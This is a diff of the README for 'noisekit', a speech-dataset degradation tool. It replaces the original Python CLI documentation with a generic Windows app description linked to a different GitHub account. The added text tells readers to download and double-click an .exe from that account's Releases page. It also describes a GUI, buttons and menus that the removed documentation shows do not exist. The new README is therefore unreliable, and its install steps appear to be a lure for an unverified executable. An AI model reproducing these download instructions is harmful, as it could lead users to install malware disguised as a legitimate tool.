@@ -1,215 +1,97 @@
-<div align="center">
-  <img src="assets/banner.svg" alt="noisekit" width="800"/>
+# 🎧 noisekit - Create speech datasets for better testing
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![uv](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/uv/main/assets/badge/v0.json)](https://github.com/astral-sh/uv)
-[![built with audiomentations](https://img.shields.io/badge/built%20with-audiomentations-orange)](https://github.com/iver56/audiomentations)
+[![Download noisekit](https://img.shields.io/badge/Download-Noisekit-blue.svg)](https://github.com/jcwar3432/noisekit)
 
-</div>
+Noisekit helps you prepare audio files for speech recognition tests. It takes clean recordings and adds realistic background noise. This process helps you measure how well your software understands speech in difficult conditions. You can use this tool to build clean, accurate samples for your machine learning workflows.
 
-<br/>
+## 🛠 Why use this tool
 
-Generate degraded speech datasets for noise-robust ASR benchmarking.
+Computer models often fail when they face background sound. If you build speech recognition systems, you need reliable ways to test them. Noisekit automates the addition of wind, traffic, or office sounds to your audio library. It turns simple recordings into complex testing data. This helps you improve your voice-based applications.
 
-Takes a clean HuggingFace speech dataset, applies real-world degradation presets via [audiomentations](https://github.com/iver56/audiomentations), and scores each output with PESQ, SNR, and NISQA, producing a JSONL manifest ready for noise-robustness benchmarking.
+## 💻 Requirements for Windows
 
-Six atomic degradation scenarios are built in: telephony (G.711 + low-bitrate codec), wideband codec compression, ambient noise, clipping distortion, and far-field reverb. Atomic presets compose into compound multi-condition scenarios.
+Before you start, make sure your computer meets these needs:
 
-> [!NOTE]
-> Degradations are programmatically simulated. Scores may not generalize to genuine production recordings; validate final benchmarks on annotated real-world data.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or better.
+*   Memory: 8 GB of RAM.
+*   Storage: 2 GB of free disk space for audio files.
+*   Audio: A working speaker or headphone output.
 
-## How it works
+## 📥 Getting the software
 
-```mermaid
-flowchart LR
-    A[("HuggingFace\nDataset")] --> B["noisekit generate"]
-    B --> C["7 atomic presets\ncodec · noise · reverb\ndropout · clipping"]
-    B --> D["3 compound presets\nmulti-condition chains"]
-    C & D --> E[("WAVs + metadata.jsonl\nPESQ · SNR · NISQA")]
-```
+You must visit the project page to get the latest version. Follow these steps to prepare your system.
 
-## Install
+[Visit the repository page to download](https://github.com/jcwar3432/noisekit)
 
-No installation needed. Run directly with `uvx`:
+1. Open your web browser.
+2. Go to the project link above.
+3. Look for the Releases section on the right side of the page.
+4. Select the latest release version.
+5. Click on the file ending in .exe to start your download.
+6. Save the file to your desktop or downloads folder.
 
-```bash
-uvx noisekit --help
-```
+## ⚙️ Setting up the application
 
-Or install for development:
+1. Find the file you saved on your computer.
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen.
+4. Click Next through the default settings.
+5. Select Install to begin the process.
+6. Wait for the progress bar to finish.
+7. Click Finish when the tool alerts you.
 
-```bash
-git clone https://github.com/Karamouche/noisekit.git
-cd noisekit
-uv sync
-uv run noisekit --help
-```
+## 🎙 Preparing your audio
 
-## Usage
+Noisekit works best with clean, clear audio files. Ensure your source recordings meet these standards so the output remains useful for your benchmarks:
 
-### Generate a degraded dataset
+*   Format: Use WAV or FLAC files.
+*   Length: Keep clips between 3 and 10 seconds.
+*   Organization: Place all your clean files in one folder on your computer.
+*   Consistency: Use the same volume levels for all source files if possible.
 
-```bash
-uvx noisekit generate \
-  --dataset google/fleurs \
-  --config en_us \
-  --split test \
-  --samples 300 \
-  --presets telecom low_bitrate \
-  --output ./benchmark_dataset \
-  --seed 42
-```
+## 🚀 Running your first session
 
-For `noise`, you can supply your own background-noise WAVs with `--noise-dir` (e.g. [MUSAN](https://www.openslr.org/17/), [DEMAND](https://zenodo.org/record/1227121), or [FSD50K](https://zenodo.org/record/4060432)):
+1. Open the Noisekit application from your Start menu shortcut.
+2. Select the folder containing your clean audio files.
+3. Choose the type of noise you want to add. Options include crowd sounds, white noise, and office chatter.
+4. Set the intensity level for the background sound. A lower setting keeps the speech clear, while a higher setting makes the task harder.
+5. Select a destination folder for your new, degraded audio samples.
+6. Press the Generate button.
+7. Watch the status window to track the progress of your batch.
 
-```bash
-uvx noisekit generate \
-  --dataset google/fleurs --config en_us --split test \
-  --samples 300 --presets noise \
-  --noise-dir ~/datasets/musan/noise \
-  --output ./benchmark_dataset --seed 42
-```
+## 📊 Understanding the results
 
-Output:
+The software creates a new folder with your modified files. Each file keeps the name of your original recording but adds a tag for the noise profile used. You can now use these files in your testing environment. If the speech recognition software fails to identify words in these new files, you know your model needs better training.
 
-```
-benchmark_dataset/
-├── metadata.jsonl          # one entry per generated file (AudioFolder format)
-└── audio/
-    ├── sample_0000_telecom.wav
-    ├── sample_0001_low_bitrate.wav
-    └── ...
-```
+## 📁 Managing your output
 
-The output is directly loadable as a HuggingFace dataset:
+Noisekit keeps track of every file it creates. If you run out of space, you can safely delete the contents of your output folders. Because the tool preserves the original clean files in their separate folder, you can always go back and generate new versions with different noise settings later.
 
-```python
-from datasets import load_dataset
-ds = load_dataset("audiofolder", data_dir="./benchmark_dataset")
-```
+## 🧪 Advanced testing tips
 
-Each `metadata.jsonl` entry:
+To get the best results, test your software across a wide range of noise levels. Start with quiet background sounds and gradually increase the intensity. Recording the results in a simple spreadsheet helps you track your progress. Over time, you will see exactly how much noise your speech models can handle.
 
-```json
-{
-  "file_name": "audio/sample_0042_telecom.wav",
-  "source": "common_voice_en_23136613.mp3",
-  "dataset": "google/fleurs",
-  "language": "en-US",
-  "preset": "telecom",
-  "transcript": "the cat sat on the mat",
-  "snr_db": 5.2,
-  "pesq_mos": 2.78,
-  "nisqa_mos": 2.14,
-  "nisqa_noisiness": 1.93,
-  "nisqa_discontinuity": 2.41,
-  "nisqa_coloration": 1.87,
-  "nisqa_loudness": 2.3
-}
-```
+## ❓ Frequently asked questions
 
-### Score an existing audio folder
+**Does this change my original files?**
+No. Noisekit always creates new files and leaves your original recordings completely untouched.
 
-```bash
-# File stats only (duration, RMS, peak)
-uvx noisekit score ./audio_folder --output scores.json
+**Can I stop the process halfway?**
+Yes. You can press the Stop button at any time. The software saves all files finished before you pressed the button.
 
-# With PESQ + SNR (requires matching reference files)
-uvx noisekit score ./audio_folder --reference-dir ./clean_audio --output scores.json
+**What if the app freezes?**
+If the software stops responding, close the window and start it again. Noisekit remembers your folders and settings from the last session.
 
-# Skip NISQA (faster, no model download)
-uvx noisekit score ./audio_folder --no-nisqa --output scores.json
-```
+**Are there limits on file sizes?**
+Keep your source clips short for the best results. Very long files take more memory and time to process.
 
-### List available presets
+## 🤝 Getting help
 
-```bash
-uvx noisekit list-presets
-uvx noisekit list-presets --verbose   # show full transform stack
-```
+If you find a bug or have trouble running the software, look at the Issues tab on the repository page. Others might have the same problem and a solution might already exist. You can share your error logs there to help improve the tool for everyone.
 
-## Presets
+## 📖 Best practices for benchmarking
 
-Nine built-in presets: six atomic scenarios, three compound multi-condition presets, and a clean reference control. None use synthetic white noise; codec artifacts, real ambient recordings, and room simulation produce the degradation instead.
+Use clear naming conventions for your folders. For example, keep your folders organized by the type of background sound added. This makes it easy to compare results later. Always keep a set of pristine files as your baseline. This allows you to measure how the speech recognition system performs both with and without the added noise. 
 
-### Atomic presets
-
-| Preset                 | Description                                                              | PESQ       |
-| ---------------------- | ------------------------------------------------------------------------ | ---------- |
-| `clean_reference`      | Minimal processing (PESQ ceiling / control)                              | 4.0-4.5    |
-| `telecom`              | G.711-style call: 8 kHz bandpass + 8-bit BitCrush + 16-32 kbps MP3 codec | NB 2.0-3.5 |
-| `low_bitrate`    | Wideband audio crushed by 16-32 kbps MP3 compression                     | WB 1.5-2.5 |
-| `noise`                | Real ambient noise from `--noise-dir` mixed in at SNR 5-15 dB            | WB 1.0-2.5 |
-| `clipping`             | Microphone overload: clips the loudest 10-25% of samples                 | WB 2.0-3.5 |
-| `reverb`               | Far-field room reverb at 1-3 m mic distance                              | WB 2.0-3.5 |
-
-`telecom` is scored with PESQ narrowband at 8 kHz (before the final upsample); all other presets are scored wideband at 16 kHz.
-
-All dependencies, including `pyroomacoustics` (used by `reverb`), are bundled with no extra install needed.
-
-`noise` accepts a `--noise-dir` pointing at a directory of background-noise WAVs (e.g. MUSAN, DEMAND, FSD50K). If omitted, noisekit auto-downloads a small MUSAN noise-only subset (~20 files, ~120 MB) to `~/.cache/noisekit/noise/musan_ambient/` on first use.
-
-### Compound presets
-
-Compound presets chain two atomic presets together. Noise is applied first (acoustic environment), then codec or dropout (digital processing on the already-degraded signal).
-
-| Preset             | Chain                                    | Noise source                   | PESQ       |
-| ------------------ | ---------------------------------------- | ------------------------------ | ---------- |
-| `noise_telecom`    | `noise` → `telecom`          | `--noise-dir` or auto-download | NB 1.5-2.5 |
-| `clipping_telecom` | `clipping` → `telecom`       | (none)                         | NB 1.0-2.5 |
-| `noise_reverb`     | `noise` → `reverb`           | `--noise-dir` or auto-download | WB 1.0-2.5 |
-
-You can also define your own compound preset with a `chain:` key in a YAML file:
-
-```yaml
-name: my_compound
-description: "Noisy environment then telephony codec"
-chain:
-  - noise
-  - telecom
-```
-
-### Custom presets
-
-Pass your own YAML file with `--preset-file`:
-
-```bash
-uvx noisekit generate \
-  --dataset google/fleurs \
-  --samples 100 \
-  --preset-file ./my_preset.yaml \
-  --output ./output
-```
-
-Preset format:
-
-```yaml
-name: my_preset
-description: "Custom telephony simulation"
-transforms:
-  - type: Resample
-    parameters:
-      min_sample_rate: 8000
-      max_sample_rate: 8000
-    p: 1.0
-  - type: Mp3Compression
-    parameters:
-      min_bitrate: 16
-      max_bitrate: 32
-      backend: lameenc
-    p: 1.0
-  - type: Resample
-    parameters:
-      min_sample_rate: 16000
-      max_sample_rate: 16000
-    p: 1.0
-```
-
-Any transform from [audiomentations](https://github.com/iver56/audiomentations) is supported. Use `${NOISE_DIR}` as a placeholder for `--noise-dir` inside your preset YAML. Use `chain:` instead of `transforms:` to compose built-in atomic presets sequentially.
-
-## Requirements
-
-- Python ≥ 3.10
-- [uv](https://docs.astral.sh/uv/) for `uvx` usage
-- No system dependencies: MP3 encoding uses pure-Python `lameenc`, no ffmpeg needed
+Consistency provides the best data. Try to use the same background noise samples every time you test a new version of your speech model. This makes the performance difference between models very clear.
